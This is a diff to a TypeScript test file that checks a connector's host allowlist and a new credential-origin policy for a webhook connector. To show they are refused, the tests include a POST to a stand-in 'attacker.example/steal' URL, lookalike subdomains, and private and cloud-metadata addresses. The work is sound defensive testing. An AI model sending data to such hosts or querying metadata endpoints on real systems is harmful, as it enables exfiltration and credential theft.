@@ -1,5 +1,6 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 
+import { connectorHostPolicy } from '../shared/schemas/connectors';
 import {
   checkConnectorRequestUrl,
   createLiveHost,
@@ -42,6 +43,15 @@ const NATIVE_ONLY: LiveHostConnector = {
   name: 'webdav',
   endpointMode: 'fixed',
   allowedHosts: [],
+};
+
+/** The callback shape: no shipped host, the credential's own origin is the
+ * whole allowlist. */
+const CALLBACK: LiveHostConnector = {
+  name: 'webhook-channel',
+  endpointMode: 'per-credential',
+  allowedHosts: [],
+  hostPolicy: 'credential-origin',
 };
 
 function jsonResponse(
@@ -125,11 +135,7 @@ describe('host allowlist', () => {
       checkConnectorRequestUrl('https://evil-atlassian.net/wiki', CONFLUENCE),
     ).toThrow(/not allowed for connector "confluence"/);
     expect(
-      hostMatchesAllowEntry(
-        'evil-atlassian.net',
-        'atlassian.net',
-        'per-credential',
-      ),
+      hostMatchesAllowEntry('evil-atlassian.net', 'atlassian.net', 'suffix'),
     ).toBe(false);
   });
 
@@ -438,5 +444,97 @@ describe('base64 helpers', () => {
     const encoded = host.base64Encode('héllo wörld');
     expect(encoded).toBe(Buffer.from('héllo wörld', 'utf8').toString('base64'));
     expect(host.base64Decode(encoded)).toBe('héllo wörld');
+  });
+});
+
+describe('hostPolicy: credential-origin (the callback connector)', () => {
+  it('reaches the credential origin and nothing else', async () => {
+    const host = createLiveHost({
+      connector: CALLBACK,
+      endpoint: 'https://desk.example.com',
+      action: 'send_message',
+    });
+    await host.http.post('https://desk.example.com/hooks/inbox', {
+      body: '{}',
+    });
+    expect(lastRequest().url).toBe('https://desk.example.com/hooks/inbox');
+    await expect(
+      host.http.post('https://attacker.example/steal', { body: '{}' }),
+    ).rejects.toThrow(/not allowed for connector "webhook-channel"/);
+    expect(fetchStub).toHaveBeenCalledTimes(1);
+  });
+
+  it('admits the origin EXACTLY — a subdomain of it is a different host', async () => {
+    const host = createLiveHost({
+      connector: CALLBACK,
+      endpoint: 'https://desk.example.com',
+    });
+    await expect(
+      host.http.post('https://evil.desk.example.com/hooks', { body: '{}' }),
+    ).rejects.toThrow(/not allowed/);
+    expect(fetchStub).not.toHaveBeenCalled();
+  });
+
+  it('refuses a credential endpoint in private or metadata space', () => {
+    for (const endpoint of [
+      'https://10.0.0.5',
+      'https://169.254.169.254',
+      'https://metadata.google.internal',
+    ]) {
+      expect(() => createLiveHost({ connector: CALLBACK, endpoint })).toThrow(
+        /not reachable from a connector/,
+      );
+    }
+    expect(fetchStub).not.toHaveBeenCalled();
+  });
+
+  it('refuses a plaintext credential endpoint', () => {
+    expect(() =>
+      createLiveHost({
+        connector: CALLBACK,
+        endpoint: 'http://desk.example.com',
+      }),
+    ).toThrow(/https only/);
+  });
+
+  it('reaches nothing at all when the credential names no endpoint', async () => {
+    const host = createLiveHost({ connector: CALLBACK });
+    await expect(
+      host.http.post('https://desk.example.com/hooks', { body: '{}' }),
+    ).rejects.toThrow(/no credential endpoint/);
+    expect(fetchStub).not.toHaveBeenCalled();
+  });
+
+  it('leaves a connector that did not opt in on its declared allowlist', async () => {
+    const host = createLiveHost({
+      connector: CONFLUENCE,
+      endpoint: 'https://site.atlassian.net',
+    });
+    await host.http.get('https://other.atlassian.net/wiki');
+    expect(lastRequest().url).toBe('https://other.atlassian.net/wiki');
+  });
+});
+
+describe('hostPolicy defaults', () => {
+  it('follows endpointMode when a connector declares none', () => {
+    expect(connectorHostPolicy({ endpointMode: 'fixed' })).toBe('exact');
+    expect(connectorHostPolicy({ endpointMode: 'per-credential' })).toBe(
+      'suffix',
+    );
+  });
+
+  it('lets a declared policy win over the mode', () => {
+    expect(
+      connectorHostPolicy({
+        endpointMode: 'per-credential',
+        hostPolicy: 'credential-origin',
+      }),
+    ).toBe('credential-origin');
+    expect(
+      connectorHostPolicy({
+        endpointMode: 'per-credential',
+        hostPolicy: 'exact',
+      }),
+    ).toBe('exact');
   });
 });
